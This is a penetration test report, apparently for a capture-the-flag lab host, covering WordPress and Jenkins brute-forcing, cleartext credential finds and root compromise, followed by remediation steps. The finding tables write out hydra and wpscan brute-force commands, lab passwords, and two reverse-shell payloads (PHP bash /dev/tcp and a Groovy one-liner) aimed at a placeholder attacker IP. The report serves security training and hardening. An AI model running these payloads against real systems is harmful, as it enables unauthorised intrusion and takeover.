# 🛡️ Penetration Test Report: internal.thm

**File Name:** `report.md`
**Target:** `internal.thm` (10.201.35.3)
**Assessment Date:** November 2025
**Tested By:** Security Team
**Report Version:** 3.0 (Includes Full Commands Log)

---

## 1. Executive Summary

The assessment resulted in a **CRITICAL** finding, leading to **full root system compromise**. The initial weakness was a **weak password** on the public-facing WordPress service, which cascaded into critical credential storage failures. The most severe flaw was the discovery of the **Root password stored in cleartext** on the file system, bypassing all standard privilege escalation efforts.

**Immediate and urgent action is required** to implement secure password policies, patch legacy software, and enforce secret management protocols.

### Summary of Findings by Severity

| ID | Finding Title | Severity | Exploited Commands Used |
| :--- | :--- | :--- | :--- |
| **C-01** | Cleartext Root Password in Plain File | **CRITICAL** | `cat notes.txt`, `su root` |
| **C-02** | Sensitive Data Disclosure (User Credentials) | **CRITICAL** | `cat /opt/wp-save.txt`, `ssh aubreanna@10.201.35.3` |
| **H-01** | Weak Credentials for WordPress (Admin) | **HIGH** | `wpscan ... --passwords rockyou.txt` |
| **H-02** | Weak Credentials for Internal Jenkins Service | **HIGH** | `ssh -L ...`, `hydra ... -P rockyou.txt` |
| **M-01** | Outdated and Insecure WordPress Version (5.4.2) | **MEDIUM** | `wpscan --url http://internal.thm/blog/` |
| **L-01** | Outdated Apache HTTP Server Version (2.4.29) | **LOW** | `nmap -sV -A 10.201.35.3` |

---

## 2. Technical Findings and Remediation

### Initial Reconnaissance and Enumeration

| Step | Context | Command from Notes | Key Result |
| :--- | :--- | :--- | :--- |
| **1. Port Scan** | Attacker Machine | `nmap -sC -sV -A 10.201.35.3` | Ports 22 (SSH) and 80 (HTTP) Open. Apache httpd 2.4.29 identified. |
| **2. Directory Scan** | Attacker Machine | `gobuster dir -u http://10.201.35.3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` | Discovered `/blog/` and `/phpmyadmin/` paths. |
| **3. WP Version Check** | Attacker Machine | `wpscan --url http://internal.thm/blog/` | Identified WordPress version **5.4.2**. |

### CRITICAL FINDINGS

#### C-01: Cleartext Root Password in Plain File

* **Severity:** **CRITICAL**
* **Description:** The root user's password was discovered in the file `/home/jenkins/notes.txt` after compromising the Jenkins service.
* **Exploitation Path (Evidence - Commands Used):**

    | Step | Context | Command from Notes | Result |
    | :--- | :--- | :--- | :--- |
    | **1. File Discovery** | Jenkins Shell | `cat notes.txt` | Root Password Found: **`tr0ub13guM!@#123`** |
    | **2. Privilege Escalation** | Jenkins Shell | `su root` | Full System Compromise (Root Access) Achieved. |
    | **3. Final Flag** | Root Shell | `cat /root/root.txt` | Root Flag Retrieved. |

* **Remediation Tachtiqque:** **Immediate rotation** of the root password. Implement a dedicated, hardened secrets management vault for all privileged credentials.

#### C-02: Sensitive Data Disclosure (User Credentials)

* **Severity:** **CRITICAL**
* **Description:** The credentials for user `aubreanna` were found in a cleartext file (`wp-save.txt`) in the `/opt/` directory, accessible to the low-privileged web user (`www-data`).
* **Exploitation Path (Evidence - Commands Used):**

    | Step | Context | Command from Notes | Result |
    | :--- | :--- | :--- | :--- |
    | **1. Credential Recovery** | www-data Shell | `cat /opt/wp-save.txt` | User credentials recovered: **`aubreanna:bubb13guM!@#123`** |
    | **2. Lateral Movement** | Attacker Machine | `ssh aubreanna@10.201.35.3` | Stable shell access as user `aubreanna` achieved. |
    | **3. Internal Recon** | aubreanna Shell | `cat jenkins.txt` | Discovered internal service: **172.17.0.2:8080**. |

* **Remediation Tachtiqque:** Rotate `aubreanna`'s password. Enforce the **Principle of Least Privilege (PoLP)** by restricting `www-data` from reading files in non-web directories like `/opt/`.

### HIGH FINDINGS

#### H-01: Weak Credentials for WordPress (Admin)

* **Severity:** **HIGH**
* **Description:** The WordPress administrative account used a simple password easily found in common wordlists.
* **Exploitation Path (Evidence - Commands Used):**

    | Step | Context | Command from Notes | Result |
    | :--- | :--- | :--- | :--- |
    | **1. Brute-Force** | Attacker Machine | `wpscan --url http://internal.thm/blog/wp-login.php --usernames Admin --passwords /usr/share/wordlists/rockyou.txt` | Valid pair found: **`Admin:my2boys`** |
    | **2. Listener Setup** | Attacker Machine | `nc -lvnp 4444` | Listener prepared for reverse shell. |
    | **3. Shell Execution** | WP Theme Editor | *PHP code injected:* `exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKING_IP/4444 0>&1'")` | Initial shell access as `www-data`. |

* **Remediation Tachtiqque:** Implement **MFA** for all admin users and enforce a minimum 16-character complex password policy.

#### H-02: Weak Credentials for Internal Jenkins Service

* **Severity:** **HIGH**
* **Description:** The internal Jenkins service used a weak administrative password, granting full administrative control and Remote Code Execution (RCE) capability.
* **Exploitation Path (Evidence - Commands Used):**

    | Step | Context | Command from Notes | Result |
    | :--- | :--- | :--- | :--- |
    | **1. Network Bridge** | aubreanna Shell | `ssh -L 8888:172.17.0.2:8080 aubreanna@10.201.35.3` | Creates a local tunnel to Jenkins service. |
    | **2. Brute-Force** | Attacker Machine | `hydra 127.0.0.1 -s 8080 -V -f http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt` | Valid pair found: **`admin:spongebob`**. |
    | **3. RCE** | Jenkins Console | *Groovy Script executed:* `r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING_IP/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()` | Reverse shell as `jenkins` user obtained. |

* **Remediation Tachtiqque:** Enforce the strong password policy and immediately **disable or strictly limit** access to the Groovy Script Console.

---

## 3. Mitigation Tachtiqques and Remediation Plan

This section details the actionable security tactics required to mitigate the identified findings.

### Tactic A: Secure Credential Management (Focus on CRITICAL C-01 & C-02)

| Remediation Step | Tachtiqque | Command/Action |
| :--- | :--- | :--- |
| **1. Root Password Rotation** | Vault Integration | **Action:** Immediately rotate the root password to a 32-character random string. **Command:** `passwd root` |
| **2. Secure File Deletion** | Secure Deletion | Locate and securely delete files containing cleartext passwords. **Command:** `shred -u /opt/wp-save.txt` **Command:** `shred -u /home/jenkins/notes.txt` |
| **3. PoLP Enforcement** | Access Control | Restrict the `www-data` user's read access to all non-web directories. **Command:** `chmod 700 /opt` (or specific ACLs) |
| **4. SSH Key-Only Access** | Key-Based Auth | Disable password login for SSH. **Command:** Edit `/etc/ssh/sshd_config`, set `PasswordAuthentication no`, and restart service. |

### Tactic B: Proactive Defense Against Brute Force (Focus on HIGH H-01 & H-02)

| Remediation Step | Tachtiqque | Command/Action |
| :--- | :--- | :--- |
| **1. Implement MFA** | Adaptive Authentication | **Action:** Deploy MFA for WordPress and Jenkins. |
| **2. Login Rate Limiting** | Fail2Ban | Install and configure Fail2Ban to monitor logs and block brute-force IPs. **Command:** `sudo apt install fail2ban` **Command:** `sudo systemctl enable fail2ban` |
| **3. Enforce Strong Passwords** | Policy Management | **Action:** Mandate minimum 16-character passwords across all systems. **Command:** *Update PAM or Active Directory policy.* |

### Tactic C: Patching and Hardening (Focus on M-01 & L-01)

| Remediation Step | Tachtiqque | Command/Action |
| :--- | :--- | :--- |
| **1. System Updates** | Automated Patching | Update all OS packages and services immediately. **Command:** `sudo apt update && sudo apt upgrade -y` |
| **2. WordPress Upgrade** | Application Patching | Update WordPress core. **Command:** *Use WP-CLI or the WordPress dashboard auto-updater.* |
| **3. Jenkins RCE Mitigation** | Feature Restriction | Disable the Groovy Script Console to prevent post-login RCE. **Action:** *Configure Jenkins security settings.* |
